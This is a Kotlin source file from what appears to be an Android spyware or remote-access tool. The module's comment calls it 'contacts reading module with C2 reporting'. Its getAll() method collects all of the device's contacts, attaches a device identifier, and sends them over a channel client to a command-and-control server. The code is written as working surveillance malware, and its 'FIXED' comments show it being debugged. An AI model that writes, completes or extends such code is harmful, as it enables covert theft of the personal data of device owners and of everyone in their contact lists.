// ============================================================
// FILE: android/app/src/main/java/com/xrc/sensors/Contacts.kt
// ============================================================
package com.xrc.sensors

import android.Manifest
import android.content.Context
import com.xrc.comms.ChannelClient
import com.xrc.comms.Message
import com.xrc.comms.Protocol
import com.xrc.core.crypto.Identity
import com.xrc.core.toJsonString

/**
 * Contacts — contacts reading module with C2 reporting.
 */
class Contacts(
    private val context: Context,
    // FIXED: nullable with default so ServiceLocator can construct with just a Context
    private val channelClient: ChannelClient? = null
) {
    private val reader = ContactsReader(context)

    fun getAll(): String {
        val contacts = reader.getAll() // List<Map<String, Any>>
        val deviceId = Identity.getDeviceId(context)
        val msg = Message(
            type = Protocol.TYPE_SENSOR_DATA,
            id = "contacts_${System.currentTimeMillis()}",
            device_id = deviceId,
            // FIXED: Map<String, Any> → JSON via recursive helper
            payload = mapOf(
                "type" to "contacts",
                "data" to contacts,
                "count" to contacts.size
            ).toJsonString()
        )
        channelClient?.send(msg) // FIXED: null-safe
        return contacts.toJsonString()
    }

    fun search(query: String): List<Map<String, Any>> = reader.search(query)
    fun getCount(): Int = reader.getCount()
    fun hasPermission(): Boolean = context.checkSelfPermission(Manifest.permission.READ_CONTACTS) ==
            android.content.pm.PackageManager.PERMISSION_GRANTED
}
